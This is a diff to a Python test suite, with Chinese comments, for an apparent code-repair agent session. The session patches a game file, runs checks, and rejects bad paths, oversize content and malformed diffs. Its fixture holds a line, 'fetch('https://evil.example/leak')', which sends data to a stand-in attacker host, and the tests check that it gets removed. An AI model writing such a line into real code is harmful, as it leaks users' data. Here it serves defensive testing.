@@ -13,12 +13,16 @@ def _files():
     ]
 
 
+def _patch(old: str, new: str, path: str = "game.js") -> str:
+    return f"--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n-{old}\n+{new}"
+
+
 def _outcome(**overrides):
     base = dict(
         files=_files(),
         changed=["game.js"],
         tokens=321,
-        logs=["agent wrote game.js (24B)"],
+        logs=["agent patched game.js (1 hunk(s), 24B)"],
         note="FIXED: removed fetch call",
         checks_ok=True,
         turns=3,
@@ -29,14 +33,22 @@ def _outcome(**overrides):
 
 # ---- RepairSession 工具面 ----
 
-def test_session_read_write_checks_roundtrip():
+def test_session_read_patch_checks_roundtrip():
     s = code_agent.RepairSession.from_files(_files())
     assert "fetch" in s.read_file("game.js")
     report = s.run_checks()
     assert "CHECKS FAILED" in report and "fetch()" in report
     assert not s.checks_ok
 
-    out = s.write_file("game.js", "var score = 0; function tick() { score += 1; }")
+    out = s.apply_patch(
+        "game.js",
+        "```diff\n"
+        + _patch(
+            "var score = 0; fetch('https://evil.example/leak');",
+            "var score = 0; function tick() { score += 1; }",
+        )
+        + "\n```",
+    )
     assert "run_checks" in out
     assert s.changed == {"game.js"}
     report = s.run_checks()
@@ -48,21 +60,41 @@ def test_session_read_write_checks_roundtrip():
     assert "fetch" not in files[2]["content"]
 
 
-def test_session_write_resets_checks_flag():
+def test_session_patch_resets_checks_flag():
     s = code_agent.RepairSession.from_files(_files())
-    s.write_file("game.js", "var ok = 1;")
+    s.apply_patch(
+        "game.js",
+        _patch("var score = 0; fetch('https://evil.example/leak');", "var ok = 1;"),
+    )
     s.run_checks()
     assert s.checks_ok
-    s.write_file("game.js", "var broken = ;")
+    s.apply_patch("game.js", _patch("var ok = 1;", "var broken = ;"))
     assert not s.checks_ok  # 新编辑未复检前不可视为通过
 
 
 def test_session_rejects_unknown_path_and_oversize():
     s = code_agent.RepairSession.from_files(_files())
-    assert "not editable" in s.write_file("evil.js", "x")
+    assert "not editable" in s.apply_patch("evil.js", _patch("x", "y", path="evil.js"))
     assert "no such file" in s.read_file("nope.js")
     big = "x" * (code_agent.validation.MAX_FILE_BYTES + 1)
-    assert "exceeds" in s.write_file("game.js", big)
+    assert "exceeds" in s.apply_patch(
+        "game.js",
+        _patch("var score = 0; fetch('https://evil.example/leak');", big),
+    )
+    assert s.changed == set()
+
+
+def test_session_rejects_invalid_patch_inputs():
+    s = code_agent.RepairSession.from_files(_files())
+    assert "no unified diff hunks" in s.apply_patch("game.js", "replace everything")
+    assert "patch targets" in s.apply_patch(
+        "game.js",
+        _patch("canvas{display:block}", "canvas{display:block;color:white}", path="style.css"),
+    )
+    assert "did not apply" in s.apply_patch(
+        "game.js",
+        _patch("var missing = true;", "var ok = true;"),
+    )
     assert s.changed == set()
 
 
